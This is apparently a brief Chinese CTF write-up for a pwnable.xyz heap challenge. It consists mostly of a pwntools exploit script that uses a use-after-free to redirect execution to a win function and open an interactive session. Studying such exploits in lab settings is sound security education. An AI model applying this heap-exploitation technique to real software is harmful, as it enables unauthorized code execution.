### 知识点

- UAF
- UNLINK？



题目说有两种方法，这里用的UAF。



### 脚本

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']


def deadbeef():
    hb = 0xdead
    lb = 0xbeef
    payload_h = p8(0xff) * (hb // 0xff) + p8(hb % 0xff)
    payload_l = p8(0xff) * (lb // 0xff) + p8(lb % 0xff)
    payload_l = payload_l.ljust(len(payload_h), b'\x00')
    return payload_h + payload_l


p = remote('svc.pwnable.xyz', 30034)
# p = process('./challenge')

p.sendafter(b'@you> ', b'/gift\n')
payload = deadbeef()
p.sendlineafter(b'be: ', str.encode(str(len(payload))))
p.sendafter(b'gift: ', payload)

p.sendafter(b'@you> ', b'/gift\n')
win_addr = 0x400cae
payload = b'a' * 8 + p64(win_addr) + b'a' * 15
p.sendlineafter(b'be: ', str.encode(str(len(payload))))
p.sendafter(b'gift: ', payload)


# gdb.attach(p)
p.sendafter(b'@you> ', b'/gift\n')
p.interactive()

```

